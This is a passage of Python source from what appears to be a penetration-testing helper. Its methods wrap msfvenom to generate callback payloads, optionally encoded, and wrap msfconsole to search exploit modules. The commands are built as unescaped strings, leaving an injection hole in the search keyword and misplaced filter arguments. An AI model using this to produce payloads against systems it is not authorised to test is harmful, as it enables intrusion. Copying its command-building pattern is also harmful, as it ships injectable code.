        logger.info(f"Generating Metasploit payload: {payload}")

        # Determine output path
        if output_path is None:
            desktop = Path.home() / "Desktop"
            output_path = (
                desktop / f"payload_{payload.replace('/', '_')}_{int(time.time())}.{output_format}"
            )

        # Build msfvenom command
        cmd_parts = [
            "msfvenom",
            "-p",
            payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f",
            output_format,
            "-o",
            str(output_path),
        ]

        # Add encoding if specified
        if encoding:
            cmd_parts.extend(["-e", encoding, "-i", str(iterations)])

        cmd = " ".join(cmd_parts)

        # Execute the command
        exit_code, output = self.execute_metasploit_command(
            command=cmd,
            show_terminal=True,
            timeout=120,
            auto_fix=False,  # Don't auto-fix payload generation
        )

        if exit_code == 0:
            logger.info(f"Payload generated successfully: {output_path}")
        else:
            logger.error(f"Payload generation failed: {output}")

        return exit_code, output, output_path if exit_code == 0 else None

    def search_metasploit_exploits(
        self,
        keyword: str,
        platform: Optional[str] = None,
        exploit_type: Optional[str] = None,
    ) -> tuple[int, str, List[str]]:
        """
        Search for Metasploit exploits by keyword.

        Args:
            keyword: Search keyword
            platform: Filter by platform (windows, linux, etc.)
            exploit_type: Filter by type (exploit, auxiliary, post, etc.)

        Returns:
            Tuple of (exit_code, output, list_of_modules)
        """
        logger.info(f"Searching Metasploit exploits: {keyword}")

        # Build search command
        cmd = f"msfconsole -q -x 'search {keyword}'"

        if platform:
            cmd += f" platform:{platform}"

        if exploit_type:
            cmd += f" type:{exploit_type}"

        # Execute search
        exit_code, output = self.execute_metasploit_command(
            command=cmd,
            show_terminal=True,
            timeout=60,
            auto_fix=False,
        )

        # Parse results to extract module paths
        modules = []
        lines = output.split("\n")
        for line in lines:
            # Look for module paths in search results
            if "/" in line and not line.startswith("[*]") and not line.startswith("[+]"):
                parts = line.split()
                for part in parts:
                    if "/" in part and not part.startswith("["):
                        modules.append(part)

        return exit_code, output, modules
